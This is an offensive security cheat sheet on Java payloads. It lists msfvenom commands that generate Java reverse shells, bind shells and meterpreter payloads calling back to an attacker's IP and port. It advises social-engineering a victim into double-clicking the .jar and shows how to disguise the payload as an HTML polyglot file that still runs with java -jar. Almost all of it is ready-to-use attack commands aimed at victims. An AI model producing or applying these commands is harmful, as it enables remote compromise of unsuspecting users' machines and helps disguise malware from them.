# Java

## 01 - Generate Payloads

### 1.1 - Reverse Shells

#### 1.1.1 - TCP

Staged reverse shell.

```
$ msfvenom -p java/shell/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

Stageless reverse shell.

```
$ msfvenom -p java/shell_reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

Staged `meterpreter` reverse shell.

```
$ msfvenom -p java/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

#### 1.1.2 - HTTP

Staged reverse shell.

```
$ msfvenom -p java/meterpreter/reverse_http lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

#### 1.1.3 - HTTP via TLS

Staged reverse shell.

```
$ msfvenom -p java/meterpreter/reverse_https handlersslcert=[/path/to/certificate.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f raw -o payload.jar
```

### 1.2 - Bind Shells

Staged bind shell.

```
$ msfvenom -p java/shell/bind_tcp lport=<PORT> [RHOST=<target_IP>] -f raw -o payload.jar
```

Staged `meterpreter` reverse shell.

```
$ msfvenom -p java/meterpreter/bind_tcp lport=<PORT> [rhost=<target_IP>] -f raw -o payload.jar
```

## 02 - Execute Payloads

> [!TIP]
> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload especially when the target is windows.
> > [!TIP] Java Payloads
> > You can actually social engineer the victim to double click the `.jar` to establish connection.

```
> java -jar payload.jar
```

## 03 - Polyglot

> [!TIP]
> Feel free to experiment around binding any binary file format with `.jar` payload.

Bind the binary files together.

```
C:\> copy /y /b filename.html+payload.jar hidden_payload.html
```

It's also possible to do this in `wine`.

```
$ wine cmd.exe /y /c copy /b filename.html+payload.jar hidden_payload.html
```

Then execute it

```
C:\> java.exe -jar hidden_payload.html
```

---
## References

### Source Repositories

- [deepinstinct: JAR-Polyglot-POC](https://github.com/deepinstinct/JAR-Polyglot-POC)